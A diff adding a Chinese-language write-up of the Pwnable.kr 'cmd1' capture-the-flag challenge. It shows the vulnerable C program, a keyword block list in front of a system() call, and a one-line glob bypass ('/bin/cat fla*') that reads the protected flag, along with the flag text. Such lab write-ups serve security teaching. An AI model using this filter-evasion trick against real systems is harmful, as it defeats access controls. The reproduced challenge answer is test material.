@@ -9946,7 +9946,7 @@ Enter Bet: $
 
 ### lotto
 
-这是**Pwnable.kr**的第十二个挑战`lotto`，来自**[Toddler's Bottle]**部分。
+这是**Pwnable.kr**的第十三个挑战`lotto`，来自**[Toddler's Bottle]**部分。
 
 ```bash
 Mommy! I made a lotto program for my homework.
@@ -10113,6 +10113,85 @@ shell.close()
 ```
 
 提交 `sorry mom... I FORGOT to check duplicate numbers... :(` 即可。
+
+------
+
+### cmd1
+
+这是**Pwnable.kr**的第十四个挑战`cmd1`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Mommy! what is PATH environment in Linux?
+
+ssh cmd1@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh cmd1@pwnable.kr -p2222
+cmd1@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 18:33:53 2023 from 147.235.193.152
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+cmd1@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root cmd1     4096 Mar 23  2018 .
+drwxr-xr-x 117 root root     4096 Nov 10  2022 ..
+d---------   2 root root     4096 Jul 12  2015 .bash_history
+-r-xr-sr-x   1 root cmd1_pwn 8513 Jul 14  2015 cmd1
+-rw-r--r--   1 root root      320 Mar 23  2018 cmd1.c
+-r--r-----   1 root cmd1_pwn   48 Jul 14  2015 flag
+dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
+drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
+```
+
+我们可以看到三个文件`cmd1`、`cmd1.c`和`flag`，其中`cmd1`是`ELF`二进制可执行文件，`cmd1.c`是编译二进制文件的`C`代码，用户`cmd1`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat cmd1.c`来查看`cmd1.c`的代码。
+
+```c
+cmd1@pwnable:~$ cat cmd1.c
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+    int r=0;
+    r += strstr(cmd, "flag")!=0;
+    r += strstr(cmd, "sh")!=0;
+    r += strstr(cmd, "tmp")!=0;
+    return r;
+}
+int main(int argc, char* argv[], char** envp){
+    putenv("PATH=/thankyouverymuch");
+    if(filter(argv[1])) return 0;
+    system( argv[1] );
+    return 0;
+}
+```
+
+虽然`flag`，`sh`，`tmp`都被过滤啦，但是办法还是有的，比如我们可以用`/bin/cat fla*`来将当前目录所有以`fla`开头的文件内容打印到终端。
+
+```bash
+cmd1@pwnable:~$ ./cmd1 "/bin/cat fla*"
+mommy now I get what PATH environment is for :)
+```
 
 ------
 
